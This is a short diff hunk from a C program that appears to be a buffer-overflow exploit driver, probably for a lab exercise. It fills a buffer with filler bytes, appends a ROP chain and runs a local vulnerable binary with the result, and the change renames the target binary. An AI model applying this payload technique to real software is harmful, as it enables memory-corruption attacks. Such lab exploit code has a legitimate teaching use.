@@ -18,6 +18,6 @@ void main(int argc, char *argv[]) {
   char *payload = malloc(size + sizeof(rop));
   memset(payload, 'C', size);
   memcpy(payload + size, rop, sizeof(rop));
-  execl("./stack-buffer-overflow", "./stack-buffer-overflow", payload, NULL);
+  execl("./buffer-overflow", "./buffer-overflow", payload, NULL);
 }
 
